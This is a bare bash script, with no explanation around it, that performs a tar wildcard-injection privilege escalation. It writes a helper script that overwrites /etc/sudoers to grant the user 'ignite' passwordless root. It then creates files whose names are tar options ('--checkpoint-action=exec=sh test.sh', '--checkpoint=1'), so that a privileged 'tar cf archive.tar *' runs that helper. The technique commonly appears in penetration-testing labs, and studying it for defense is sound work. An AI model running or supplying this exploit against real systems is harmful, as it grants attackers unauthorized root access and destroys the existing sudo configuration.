#!/bin/bash
echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
